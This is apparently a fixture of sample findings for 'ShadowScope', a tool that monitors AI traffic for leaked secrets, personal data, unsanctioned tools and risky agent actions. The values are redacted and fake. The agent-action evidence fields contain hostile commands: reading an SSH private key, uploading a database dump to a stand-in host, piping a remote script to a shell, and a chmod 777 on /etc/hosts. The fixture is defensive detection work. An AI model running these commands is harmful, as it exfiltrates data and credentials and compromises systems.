@@ -1,0 +1,2048 @@
+{
+  "items": [
+    {
+      "id": "fnd_0044",
+      "ts": "2026-10-30T11:36:48Z",
+      "event_id": "evt_0001",
+      "type": "agent_action",
+      "subtype": "sensitive_file_read",
+      "severity": "critical",
+      "confidence": 0.9,
+      "title": "Agent read a private SSH key",
+      "description": "Agent read a private SSH key seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "read_file ~/.ssh/id_rsa",
+        "match_redacted": "read_file ~/.ssh/id_rsa",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "65e3654e5b50"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0058",
+      "ts": "2026-10-30T11:36:48Z",
+      "event_id": "evt_0001",
+      "type": "agent_action",
+      "subtype": "sensitive_file_read",
+      "severity": "critical",
+      "confidence": 0.94,
+      "title": "Agent read a private SSH key",
+      "description": "Agent read a private SSH key seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "read_file ~/.ssh/id_rsa",
+        "match_redacted": "read_file ~/.ssh/id_rsa",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "65e3654e5b50"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0029",
+      "ts": "2026-10-30T11:25:36Z",
+      "event_id": "evt_0003",
+      "type": "pii",
+      "subtype": "ifsc",
+      "severity": "low",
+      "confidence": 0.74,
+      "title": "IFSC code",
+      "description": "IFSC code seen in Microsoft Edge traffic to Microsoft Copilot.",
+      "evidence": {
+        "redacted_snippet": "ifsc: FAKE•••••PL",
+        "match_redacted": "FAKE•••••PL",
+        "entropy": null,
+        "line": 66,
+        "offset": 770,
+        "fingerprint": "e6c0c8a2de6d"
+      },
+      "detector": "regex",
+      "provider_id": "ms_copilot",
+      "process_name": "Microsoft Edge",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0030",
+      "ts": "2026-10-30T10:40:31Z",
+      "event_id": "evt_0011",
+      "type": "pii",
+      "subtype": "passport_in",
+      "severity": "medium",
+      "confidence": 0.88,
+      "title": "Indian passport number",
+      "description": "Indian passport number seen in ChatGPT traffic to ChatGPT.",
+      "evidence": {
+        "redacted_snippet": "passport number J123••67",
+        "match_redacted": "J123••67",
+        "entropy": null,
+        "line": 60,
+        "offset": 114,
+        "fingerprint": "d52c402524f5"
+      },
+      "detector": "regex",
+      "provider_id": "chatgpt",
+      "process_name": "ChatGPT",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0060",
+      "ts": "2026-10-30T10:40:31Z",
+      "event_id": "evt_0011",
+      "type": "source_code",
+      "subtype": "source_code",
+      "severity": "medium",
+      "confidence": 0.85,
+      "title": "Source code sent to AI tool",
+      "description": "Source code sent to AI tool seen in ChatGPT traffic to ChatGPT.",
+      "evidence": {
+        "redacted_snippet": "def •••••••••••••••••••••••••••••):",
+        "match_redacted": "def •••••••••••••••••••••••••••••):",
+        "entropy": null,
+        "line": 14,
+        "offset": 626,
+        "fingerprint": "56398e682861"
+      },
+      "detector": "heuristic",
+      "provider_id": "chatgpt",
+      "process_name": "ChatGPT",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Review what was shared with the provider",
+        "Move the team to a sanctioned AI tool"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0034",
+      "ts": "2026-10-30T10:22:45Z",
+      "event_id": "evt_0014",
+      "type": "pii",
+      "subtype": "internal_host",
+      "severity": "low",
+      "confidence": 0.91,
+      "title": "Internal hostname",
+      "description": "Internal hostname seen in Code Helper (Plugin) traffic to GitHub Copilot.",
+      "evidence": {
+        "redacted_snippet": "connect to fake••••••rp",
+        "match_redacted": "fake••••••rp",
+        "entropy": null,
+        "line": 62,
+        "offset": 23,
+        "fingerprint": "249df06d0c5f"
+      },
+      "detector": "regex",
+      "provider_id": "copilot",
+      "process_name": "Code Helper (Plugin)",
+      "status": "resolved",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0020",
+      "ts": "2026-10-30T09:52:28Z",
+      "event_id": "evt_0016",
+      "type": "secret",
+      "subtype": "high_entropy_string",
+      "severity": "medium",
+      "confidence": 0.85,
+      "title": "High-entropy token",
+      "description": "High-entropy token seen in LM Studio traffic to LM Studio.",
+      "evidence": {
+        "redacted_snippet": "token: \"FAKE••••••••••••••••••••••••••••••••••dm\"",
+        "match_redacted": "FAKE••••••••••••••••••••••••••••••••••dm",
+        "entropy": 4.78,
+        "line": 67,
+        "offset": 458,
+        "fingerprint": "a575e6871bc0"
+      },
+      "detector": "entropy",
+      "provider_id": "lmstudio",
+      "process_name": "LM Studio",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0011",
+      "ts": "2026-10-30T09:12:29Z",
+      "event_id": "evt_0021",
+      "type": "secret",
+      "subtype": "groq_key",
+      "severity": "high",
+      "confidence": 0.88,
+      "title": "Groq API key exposed",
+      "description": "Groq API key exposed seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "GROQ_API_KEY=gsk_••••••••••••••••••••••••••••••••••••••••••LE",
+        "match_redacted": "gsk_••••••••••••••••••••••••••••••••••••••••••LE",
+        "entropy": 3.19,
+        "line": 67,
+        "offset": 939,
+        "fingerprint": "471a50169abc"
+      },
+      "detector": "regex",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0026",
+      "ts": "2026-10-30T09:12:29Z",
+      "event_id": "evt_0021",
+      "type": "pii",
+      "subtype": "pan",
+      "severity": "high",
+      "confidence": 0.91,
+      "title": "PAN number",
+      "description": "PAN number seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "pan: FAKP••••4E",
+        "match_redacted": "FAKP••••4E",
+        "entropy": null,
+        "line": 10,
+        "offset": 233,
+        "fingerprint": "0375360885f6"
+      },
+      "detector": "regex",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "resolved",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Notify DPO under DPDP Act 2023",
+        "Enable masking in source system"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0040",
+      "ts": "2026-10-30T09:12:29Z",
+      "event_id": "evt_0021",
+      "type": "agent_action",
+      "subtype": "data_exfil_command",
+      "severity": "high",
+      "confidence": 0.98,
+      "title": "Agent uploaded a local file",
+      "description": "Agent uploaded a local file seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "curl -F file=@dump.sql http://x.sh/upload",
+        "match_redacted": "curl -F file=@dump.sql http://x.sh/upload",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "957e2aa80fc0"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0051",
+      "ts": "2026-10-30T08:56:59Z",
+      "event_id": "evt_0022",
+      "type": "policy",
+      "subtype": "blocked_provider_contacted",
+      "severity": "critical",
+      "confidence": 0.94,
+      "title": "Blocked provider contacted",
+      "description": "Blocked provider contacted seen in Microsoft Edge traffic to DeepSeek.",
+      "evidence": {
+        "redacted_snippet": "connection to blocked provider deepseek",
+        "match_redacted": "connection to blocked provider deepseek",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "d97b98a51464"
+      },
+      "detector": "heuristic",
+      "provider_id": "deepseek",
+      "process_name": "Microsoft Edge",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Block the provider at the network edge",
+        "Follow up with the process owner"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0021",
+      "ts": "2026-10-30T08:36:29Z",
+      "event_id": "evt_0023",
+      "type": "pii",
+      "subtype": "email",
+      "severity": "medium",
+      "confidence": 0.85,
+      "title": "Customer email address",
+      "description": "Customer email address seen in ollama traffic to Ollama (local).",
+      "evidence": {
+        "redacted_snippet": "contact: f•••@e•••.com",
+        "match_redacted": "f•••@e•••.com",
+        "entropy": null,
+        "line": 80,
+        "offset": 2364,
+        "fingerprint": "f40851fe7653"
+      },
+      "detector": "regex",
+      "provider_id": "ollama",
+      "process_name": "ollama",
+      "status": "false_positive",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0031",
+      "ts": "2026-10-30T07:45:25Z",
+      "event_id": "evt_0026",
+      "type": "pii",
+      "subtype": "credit_card",
+      "severity": "critical",
+      "confidence": 0.87,
+      "title": "Credit card number (Luhn valid)",
+      "description": "Credit card number (Luhn valid) seen in node traffic to Groq.",
+      "evidence": {
+        "redacted_snippet": "card: 4111•••••••••••••11",
+        "match_redacted": "4111•••••••••••••11",
+        "entropy": null,
+        "line": 8,
+        "offset": 1745,
+        "fingerprint": "6a7e0e79b018"
+      },
+      "detector": "validator",
+      "provider_id": "groq",
+      "process_name": "node",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001",
+        "PCI-DSS"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0041",
+      "ts": "2026-10-30T06:27:42Z",
+      "event_id": "evt_0034",
+      "type": "agent_action",
+      "subtype": "privilege_escalation",
+      "severity": "high",
+      "confidence": 0.93,
+      "title": "Agent attempted privilege escalation",
+      "description": "Agent attempted privilege escalation seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "sudo chmod 777 /etc/hosts",
+        "match_redacted": "sudo chmod 777 /etc/hosts",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "021e487e1f00"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0043",
+      "ts": "2026-10-30T05:20:27Z",
+      "event_id": "evt_0044",
+      "type": "agent_action",
+      "subtype": "recon",
+      "severity": "medium",
+      "confidence": 0.78,
+      "title": "Agent ran reconnaissance commands",
+      "description": "Agent ran reconnaissance commands seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "whoami && printenv",
+        "match_redacted": "whoami && printenv",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "96257ea3417e"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0047",
+      "ts": "2026-10-30T05:20:27Z",
+      "event_id": "evt_0044",
+      "type": "agent_action",
+      "subtype": "autonomous_loop",
+      "severity": "medium",
+      "confidence": 0.98,
+      "title": "Autonomous agent loop detected",
+      "description": "Autonomous agent loop detected seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "9 requests/min, mean gap 1.4 s, 4 tool round trips",
+        "match_redacted": "9 requests/min, mean gap 1.4 s, 4 tool round trips",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "d04675a797a0"
+      },
+      "detector": "anomaly",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0018",
+      "ts": "2026-10-30T05:07:28Z",
+      "event_id": "evt_0048",
+      "type": "secret",
+      "subtype": "gcp_service_account",
+      "severity": "critical",
+      "confidence": 0.97,
+      "title": "GCP service account JSON",
+      "description": "GCP service account JSON seen in LM Studio traffic to LM Studio.",
+      "evidence": {
+        "redacted_snippet": "{\"typ•••••••••••••••••••••••••••••••••••••••••••••••••e\"}",
+        "match_redacted": "\"typ•••••••••••••••••••••••••••••••••••••••••••••••••e\"",
+        "entropy": 4.31,
+        "line": 55,
+        "offset": 2378,
+        "fingerprint": "8c0a15eec99d"
+      },
+      "detector": "regex",
+      "provider_id": "lmstudio",
+      "process_name": "LM Studio",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0059",
+      "ts": "2026-10-30T05:07:28Z",
+      "event_id": "evt_0048",
+      "type": "secret",
+      "subtype": "aws_access_key",
+      "severity": "critical",
+      "confidence": 0.91,
+      "title": "AWS access key in AI prompt",
+      "description": "AWS access key in AI prompt seen in LM Studio traffic to LM Studio.",
+      "evidence": {
+        "redacted_snippet": "AWS_ACCESS_KEY_ID=AKIA••••••••••••••EE",
+        "match_redacted": "AKIA••••••••••••••EE",
+        "entropy": 2.82,
+        "line": 16,
+        "offset": 499,
+        "fingerprint": "b91f1bfba25a"
+      },
+      "detector": "regex",
+      "provider_id": "lmstudio",
+      "process_name": "LM Studio",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Deactivate key in IAM now",
+        "Rotate & move to AWS Secrets Manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0052",
+      "ts": "2026-10-30T05:00:22Z",
+      "event_id": "evt_0051",
+      "type": "exfil_volume",
+      "subtype": "bytes_out_spike",
+      "severity": "high",
+      "confidence": 0.75,
+      "title": "Exfiltration volume spike",
+      "description": "Exfiltration volume spike seen in Windsurf traffic to Codeium / Windsurf.",
+      "evidence": {
+        "redacted_snippet": "8.4 MB sent in 90 s (z-score 6.2)",
+        "match_redacted": "8.4 MB sent in 90 s (z-score 6.2)",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "951a53d8fb8f"
+      },
+      "detector": "anomaly",
+      "provider_id": "codeium",
+      "process_name": "Windsurf",
+      "status": "resolved",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Inspect the destination and payload",
+        "Pause the process until it is reviewed"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0015",
+      "ts": "2026-10-30T04:52:25Z",
+      "event_id": "evt_0052",
+      "type": "secret",
+      "subtype": "private_key",
+      "severity": "critical",
+      "confidence": 0.97,
+      "title": "Private key pasted into AI tool",
+      "description": "Private key pasted into AI tool seen in ollama traffic to Ollama (local).",
+      "evidence": {
+        "redacted_snippet": "----•••••••••••••••••••••••••••••••••••••LE",
+        "match_redacted": "----•••••••••••••••••••••••••••••••••••••LE",
+        "entropy": 3.81,
+        "line": 42,
+        "offset": 1527,
+        "fingerprint": "4c89e0036d89"
+      },
+      "detector": "regex",
+      "provider_id": "ollama",
+      "process_name": "ollama",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0050",
+      "ts": "2026-10-30T04:52:25Z",
+      "event_id": "evt_0052",
+      "type": "shadow_ai",
+      "subtype": "sanctioned_tool_seen",
+      "severity": "info",
+      "confidence": 0.96,
+      "title": "Sanctioned AI tool observed",
+      "description": "Sanctioned AI tool observed seen in ollama traffic to Ollama (local).",
+      "evidence": {
+        "redacted_snippet": "first contact with a sanctioned AI tool",
+        "match_redacted": "first contact with a sanctioned AI tool",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "245672b20c41"
+      },
+      "detector": "process",
+      "provider_id": "ollama",
+      "process_name": "ollama",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Decide whether to sanction or block this tool",
+        "Tell the owner about the approved alternative"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0014",
+      "ts": "2026-10-30T04:37:40Z",
+      "event_id": "evt_0053",
+      "type": "secret",
+      "subtype": "jwt",
+      "severity": "high",
+      "confidence": 0.93,
+      "title": "JWT in AI prompt (alg=HS256, sub=redacted)",
+      "description": "JWT in AI prompt (alg=HS256, sub=redacted) seen in Windsurf traffic to Codeium / Windsurf.",
+      "evidence": {
+        "redacted_snippet": "Authorization: Bearer eyJh•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••re",
+        "match_redacted": "eyJh•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••re",
+        "entropy": 5.29,
+        "line": 27,
+        "offset": 1209,
+        "fingerprint": "07dea17755a8"
+      },
+      "detector": "regex",
+      "provider_id": "codeium",
+      "process_name": "Windsurf",
+      "status": "resolved",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0048",
+      "ts": "2026-10-30T04:37:40Z",
+      "event_id": "evt_0053",
+      "type": "shadow_ai",
+      "subtype": "new_unsanctioned_tool",
+      "severity": "high",
+      "confidence": 0.83,
+      "title": "New unsanctioned AI tool",
+      "description": "New unsanctioned AI tool seen in Windsurf traffic to Codeium / Windsurf.",
+      "evidence": {
+        "redacted_snippet": "first contact with an unsanctioned cloud provider",
+        "match_redacted": "first contact with an unsanctioned cloud provider",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "ba71ceca8dbd"
+      },
+      "detector": "process",
+      "provider_id": "codeium",
+      "process_name": "Windsurf",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Decide whether to sanction or block this tool",
+        "Tell the owner about the approved alternative"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0039",
+      "ts": "2026-10-30T04:05:37Z",
+      "event_id": "evt_0060",
+      "type": "agent_action",
+      "subtype": "remote_code_exec",
+      "severity": "critical",
+      "confidence": 0.86,
+      "title": "Agent piped a remote script to a shell",
+      "description": "Agent piped a remote script to a shell seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "curl http://x.sh | sh",
+        "match_redacted": "curl http://x.sh | sh",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "d74d33545108"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0006",
+      "ts": "2026-10-30T03:26:43Z",
+      "event_id": "evt_0065",
+      "type": "secret",
+      "subtype": "google_api_key",
+      "severity": "high",
+      "confidence": 0.83,
+      "title": "Google API key exposed",
+      "description": "Google API key exposed seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "GOOGLE_API_KEY=\"AIza•••••••••••••••••••••••••••••••••FA\"",
+        "match_redacted": "AIza•••••••••••••••••••••••••••••••••FA",
+        "entropy": 3.12,
+        "line": 17,
+        "offset": 1093,
+        "fingerprint": "3c1f18ad3988"
+      },
+      "detector": "regex",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0019",
+      "ts": "2026-10-30T03:26:43Z",
+      "event_id": "evt_0065",
+      "type": "secret",
+      "subtype": "generic_secret_assignment",
+      "severity": "high",
+      "confidence": 0.95,
+      "title": "Hard-coded secret assignment",
+      "description": "Hard-coded secret assignment seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "clie•••••••••••••••••••••••••••••••2\"",
+        "match_redacted": "clie•••••••••••••••••••••••••••••••2\"",
+        "entropy": 4.21,
+        "line": 40,
+        "offset": 876,
+        "fingerprint": "77129dc3eae3"
+      },
+      "detector": "regex",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0023",
+      "ts": "2026-10-30T03:26:43Z",
+      "event_id": "evt_0065",
+      "type": "pii",
+      "subtype": "phone_in",
+      "severity": "medium",
+      "confidence": 0.99,
+      "title": "Indian mobile number",
+      "description": "Indian mobile number seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "mobile +91 ••••••••10",
+        "match_redacted": "+91 ••••••••10",
+        "entropy": null,
+        "line": 25,
+        "offset": 731,
+        "fingerprint": "ff9ee1e0ccb1"
+      },
+      "detector": "regex",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0046",
+      "ts": "2026-10-30T03:26:43Z",
+      "event_id": "evt_0065",
+      "type": "agent_action",
+      "subtype": "shell_spawn",
+      "severity": "high",
+      "confidence": 0.82,
+      "title": "AI process spawned a shell",
+      "description": "AI process spawned a shell seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "python3 -> sh -c \"echo shadowscope-demo\"",
+        "match_redacted": "python3 -> sh -c \"echo shadowscope-demo\"",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "dc0a084b13c4"
+      },
+      "detector": "process",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "resolved",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0054",
+      "ts": "2026-10-30T03:26:43Z",
+      "event_id": "evt_0065",
+      "type": "agent_action",
+      "subtype": "recon",
+      "severity": "medium",
+      "confidence": 0.89,
+      "title": "Agent ran reconnaissance commands",
+      "description": "Agent ran reconnaissance commands seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "whoami && printenv",
+        "match_redacted": "whoami && printenv",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "96257ea3417e"
+      },
+      "detector": "heuristic",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "acknowledged",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0024",
+      "ts": "2026-10-30T02:06:33Z",
+      "event_id": "evt_0074",
+      "type": "pii",
+      "subtype": "phone_intl",
+      "severity": "low",
+      "confidence": 0.83,
+      "title": "International phone number",
+      "description": "International phone number seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "office +44 ••••••••00",
+        "match_redacted": "+44 ••••••••00",
+        "entropy": null,
+        "line": 80,
+        "offset": 418,
+        "fingerprint": "3aaba245903a"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "false_positive",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0057",
+      "ts": "2026-10-30T02:06:33Z",
+      "event_id": "evt_0074",
+      "type": "shadow_ai",
+      "subtype": "new_unsanctioned_tool",
+      "severity": "high",
+      "confidence": 0.87,
+      "title": "New unsanctioned AI tool",
+      "description": "New unsanctioned AI tool seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "first contact with an unsanctioned cloud provider",
+        "match_redacted": "first contact with an unsanctioned cloud provider",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "ba71ceca8dbd"
+      },
+      "detector": "process",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Decide whether to sanction or block this tool",
+        "Tell the owner about the approved alternative"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0037",
+      "ts": "2026-10-30T02:00:31Z",
+      "event_id": "evt_0075",
+      "type": "canary",
+      "subtype": "canary_token",
+      "severity": "critical",
+      "confidence": 0.9,
+      "title": "Honeytoken tripped",
+      "description": "Honeytoken tripped seen in aider traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "internal_ref=CANA•••••••••A9",
+        "match_redacted": "CANA•••••••••A9",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "ed9e4a9d320e"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "aider",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Treat as an active leak",
+        "Trace the process and user that sent the token"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0056",
+      "ts": "2026-10-30T02:00:31Z",
+      "event_id": "evt_0075",
+      "type": "source_code",
+      "subtype": "source_code",
+      "severity": "medium",
+      "confidence": 0.75,
+      "title": "Source code sent to AI tool",
+      "description": "Source code sent to AI tool seen in aider traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "def •••••••••••••••••••••••••••••):",
+        "match_redacted": "def •••••••••••••••••••••••••••••):",
+        "entropy": null,
+        "line": 1,
+        "offset": 1764,
+        "fingerprint": "56398e682861"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "aider",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Review what was shared with the provider",
+        "Move the team to a sanctioned AI tool"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0013",
+      "ts": "2026-10-30T01:36:01Z",
+      "event_id": "evt_0077",
+      "type": "secret",
+      "subtype": "sendgrid_key",
+      "severity": "high",
+      "confidence": 0.93,
+      "title": "SendGrid key exposed",
+      "description": "SendGrid key exposed seen in ChatGPT traffic to ChatGPT.",
+      "evidence": {
+        "redacted_snippet": "SENDGRID_API_KEY=SG.F•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••PL",
+        "match_redacted": "SG.F•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••PL",
+        "entropy": 3.1,
+        "line": 26,
+        "offset": 832,
+        "fingerprint": "486435aa21d7"
+      },
+      "detector": "regex",
+      "provider_id": "chatgpt",
+      "process_name": "ChatGPT",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
